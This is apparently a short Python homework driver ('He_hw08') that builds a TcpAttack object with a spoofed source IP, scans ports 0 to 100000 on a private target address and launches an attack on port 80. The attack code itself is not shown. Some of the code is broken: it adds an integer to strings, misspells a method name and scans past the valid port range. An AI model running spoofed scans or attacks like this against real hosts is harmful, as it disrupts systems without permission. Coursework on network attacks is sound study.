from He_hw08 import *

spoofIP = '98.223.72.92'
targetIP = '192.168.1.13'
rangeStart = 0
rangeEnd = 100000
port = 80
Tcp = TcpAttack(spoofIP,targetIP)
Tcp.scanTarget(rangeStart,rangeEnd)
if(Tcp.attckTarget(port)):
	print "Port "+port+" was open to attack"